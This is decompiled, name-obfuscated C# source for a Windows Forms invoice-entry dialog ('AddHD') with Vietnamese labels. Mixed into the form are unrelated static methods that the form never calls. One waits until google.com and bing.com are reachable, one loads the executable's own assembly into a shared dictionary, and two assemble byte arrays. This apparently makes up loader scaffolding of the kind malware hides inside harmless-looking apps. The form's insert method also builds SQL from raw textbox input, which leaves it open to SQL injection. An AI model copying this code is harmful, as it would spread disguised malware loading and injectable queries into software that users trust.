using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Eb8;
using Microsoft.VisualBasic.CompilerServices;
using Nk7;
using Nw27;
using Qd4;
using y8P;

namespace As6;

[DesignerGenerated]
public class Yw7 : Form
{
	private Label _txtMaHD;

	private Label _txtMaKH;

	private Label _Label3;

	private TextBox _txtMaKHH;

	private Button _btnCanc;

	internal IContainer L;

	internal TextBox I;

	internal Button o;

	internal DateTimePicker h;

	internal Ca2 U;

	public Yw7()
	{
		Ca2 ca = (U = new Ca2());
		s0Y();
	}

	protected override void Ft2(bool b4N)
	{
		try
		{
			if (b4N && L != null)
			{
				L.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(b4N);
		}
	}

	private void s0Y()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		Nn5(new Label());
		p4A(new Label());
		z1Y(new Label());
		e5Y(new TextBox());
		r6E(new TextBox());
		o3X(new Button());
		Eq5(new Button());
		e8X(new DateTimePicker());
		((Control)this).SuspendLayout();
		z3C().set_AutoSize(true);
		((Control)z3C()).set_Location(new Point(13, 26));
		((Control)z3C()).set_Name("txtMaHD");
		((Control)z3C()).set_Size(new Size(41, 13));
		((Control)z3C()).set_TabIndex(0);
		z3C().set_Text("Ma HD");
		Yw6().set_AutoSize(true);
		((Control)Yw6()).set_Location(new Point(12, 64));
		((Control)Yw6()).set_Name("txtMaKH");
		((Control)Yw6()).set_Size(new Size(40, 13));
		((Control)Yw6()).set_TabIndex(1);
		Yw6().set_Text("Ma KH");
		b0F().set_AutoSize(true);
		((Control)b0F()).set_Location(new Point(12, 107));
		((Control)b0F()).set_Name("Label3");
		((Control)b0F()).set_Size(new Size(53, 13));
		((Control)b0F()).set_TabIndex(2);
		b0F().set_Text("Ngay Lap");
		((Control)m3H()).set_Location(new Point(75, 26));
		((Control)m3H()).set_Name("txtMaHDD");
		((Control)m3H()).set_Size(new Size(197, 20));
		((Control)m3H()).set_TabIndex(3);
		((Control)g0K()).set_Location(new Point(75, 61));
		((Control)g0K()).set_Name("txtMaKHH");
		((Control)g0K()).set_Size(new Size(197, 20));
		((Control)g0K()).set_TabIndex(4);
		((Control)m7P()).set_Location(new Point(49, 163));
		((Control)m7P()).set_Name("btnOk");
		((Control)m7P()).set_Size(new Size(75, 23));
		((Control)m7P()).set_TabIndex(6);
		((ButtonBase)m7P()).set_Text("OK");
		((ButtonBase)m7P()).set_UseVisualStyleBackColor(true);
		((Control)Cj6()).set_Location(new Point(163, 163));
		((Control)Cj6()).set_Name("btnCanc");
		((Control)Cj6()).set_Size(new Size(75, 23));
		((Control)Cj6()).set_TabIndex(7);
		((ButtonBase)Cj6()).set_Text("Cancel");
		((ButtonBase)Cj6()).set_UseVisualStyleBackColor(true);
		((Control)Nt0()).set_Location(new Point(71, 101));
		((Control)Nt0()).set_Name("datetimeNgayLap");
		((Control)Nt0()).set_Size(new Size(200, 20));
		((Control)Nt0()).set_TabIndex(8);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).get_Controls().Add((Control)(object)Nt0());
		((Control)this).get_Controls().Add((Control)(object)Cj6());
		((Control)this).get_Controls().Add((Control)(object)m7P());
		((Control)this).get_Controls().Add((Control)(object)g0K());
		((Control)this).get_Controls().Add((Control)(object)m3H());
		((Control)this).get_Controls().Add((Control)(object)b0F());
		((Control)this).get_Controls().Add((Control)(object)Yw6());
		((Control)this).get_Controls().Add((Control)(object)z3C());
		((Control)this).set_Name("AddHD");
		((Form)this).set_Text("AddHD");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label z3C()
	{
		return _txtMaHD;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Nn5(Label By8)
	{
		_txtMaHD = By8;
	}

	[SpecialName]
	internal virtual Label Yw6()
	{
		return _txtMaKH;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void p4A(Label Ty8)
	{
		_txtMaKH = Ty8;
	}

	[SpecialName]
	internal virtual Label b0F()
	{
		return _Label3;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z1Y(Label d3K)
	{
		_Label3 = d3K;
	}

	[SpecialName]
	internal virtual TextBox m3H()
	{
		return I;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e5Y(TextBox Xg0)
	{
		TextBox val = (I = Xg0);
	}

	[SpecialName]
	internal virtual TextBox g0K()
	{
		return _txtMaKHH;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void r6E(TextBox Cn2)
	{
		_txtMaKHH = Cn2;
	}

	[SpecialName]
	internal virtual Button m7P()
	{
		return o;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o3X(Button Eg8)
	{
		EventHandler eventHandler = Eq6;
		Button val = o;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (o = Eg8);
		val = o;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Cj6()
	{
		return _btnCanc;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Eq5(Button p6X)
	{
		EventHandler eventHandler = Wb0;
		Button btnCanc = _btnCanc;
		if (btnCanc != null)
		{
			((Control)btnCanc).remove_Click(eventHandler);
		}
		_btnCanc = p6X;
		btnCanc = _btnCanc;
		if (btnCanc != null)
		{
			((Control)btnCanc).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual DateTimePicker Nt0()
	{
		return h;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void e8X(DateTimePicker Nd3)
	{
		DateTimePicker val = (h = Nd3);
	}

	private bool Gf3()
	{
		string text = "INSERT INTO HoaDon (MaHD,MaKH,Ngaylap)";
		text += $"VALUES ('{m3H().get_Text()}','{g0K().get_Text()}','{Nt0().get_Value().Date}')";
		return U.q6P(text);
	}

	internal static string[] Az4()
	{
		k6N.i4C();
		Assembly value = Assembly.LoadFrom(Environment.GetCommandLineArgs()[0]);
		k8A.mDic.Add("Ass", value);
		return Wg39.Hy9g();
	}

	internal static bool g3H()
	{
		string[] array = new string[2] { "https://www.google.com/", "https://www.bing.com/" };
		int num = 0;
		checked
		{
			while (num != 2)
			{
				string[] array2 = array;
				foreach (string mg in array2)
				{
					if (!Ca2.Yx0(mg))
					{
						if (num > 0)
						{
							num--;
						}
						Task.Delay(30000).Wait();
					}
					else
					{
						num++;
					}
				}
			}
			if (num == 2)
			{
				return true;
			}
			return false;
		}
	}

	private bool n7W()
	{
		return string.IsNullOrEmpty(m3H().get_Text()) || string.IsNullOrEmpty(g0K().get_Text()) || string.IsNullOrEmpty(Conversions.ToString(Nt0().get_Value().Date));
	}

	internal static byte[] Ab5(int n2M)
	{
		return c4K.Tg1(n2M, checked(n2M + 1 - 22));
	}

	private void Eq6(object sender, EventArgs e)
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a3: Unknown result type (might be due to invalid IL or missing references)
		if (n7W())
		{
			MessageBox.Show("Chua nhap gia tri", "Error", (MessageBoxButtons)0);
			return;
		}
		if (Gf3())
		{
			MessageBox.Show("Them thanh cong", "Success", (MessageBoxButtons)0);
			((Form)this).set_DialogResult((DialogResult)1);
		}
		else
		{
			MessageBox.Show("Them that bai", "Error", (MessageBoxButtons)0);
			MessageBox.Show("ID " + g0K().get_Text() + "Ten: " + m3H().get_Text() + "Date: " + Conversions.ToString(Nt0().get_Value()));
			((Form)this).set_DialogResult((DialogResult)7);
		}
		((Form)this).Close();
	}

	internal static byte[] Zr2(int[] Pg2, int g2X)
	{
		checked
		{
			byte[] array = new byte[g2X + 1];
			int num = Pg2.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = (byte)Pg2[i];
			}
			return array;
		}
	}

	private void Wb0(object sender, EventArgs e)
	{
		((Form)this).Close();
	}
}
